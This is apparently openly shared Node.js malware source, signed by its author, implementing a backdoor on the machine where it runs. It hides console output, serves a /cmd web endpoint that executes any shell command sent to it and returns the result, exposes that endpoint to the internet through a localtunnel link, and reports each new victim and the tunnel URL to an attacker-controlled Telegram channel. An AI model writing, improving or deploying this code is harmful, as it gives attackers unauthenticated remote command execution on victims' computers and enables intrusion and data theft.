// By F4LL | github.com/F4LLUHQ | @f4ll_1337 on telegram | Get inspiration skid.

// [!] - CONFIG - [!]
console.log('\x1b[8m')
//Logging
const apitoken = "Bot Token" // Telegram api token
const channelid = "ID" // Telegram channel id

// Require
const Express = require('express')
const Express_Param = require("express-param")
const Os = require("os");
const child_process = require('child_process').exec;
var ip = require("ip");
const LocalTunnel = require("localtunnel")
const Simple_Exec = require("simple-exec")
const https = require('https');
var Service = require('node-windows').Service;

var connected = "[🌀] - New client connected"
const Port = process.env.PORT || Math.floor(Math.random() * 9999)
const Web = Express()
// Persistence


https.get(`https://api.telegram.org/bot${apitoken}/sendMessage?chat_id=${channelid}&text=${connected}`)

// Server conexion
Web.use(Express_Param())

async function LocalTunnel_Establisher(){
    const Tunnel = await LocalTunnel(Port)

    let messagee = `Link : ${Tunnel.url}`
    https.get(`https://api.telegram.org/bot${apitoken}/sendMessage?chat_id=${channelid}&text=${messagee}`)
}
function restart() {
Web.use("", function(req, res){
    if(req.path == "/cmd"){
        const cte = req.fetchParameter(["exec"])
        const cte_result = Simple_Exec.executeSync(cte.exec)
        if(cte_result.error){
            res.send(cte_result.error)
            restart()
        }else{ // If
            res.send(cte_result.output)
            restart()
        } // else
    }else{ restart() } // If req path // } de mon if
}) // Web.use
} // Function restart
restart()
Web.listen(Port, function(){
    const tel = `[⚡] - Client connexion etablished on port : ${Port}`
    https.get(`https://api.telegram.org/bot${apitoken}/sendMessage?chat_id=${channelid}&text=${tel}`)
    LocalTunnel_Establisher()
})
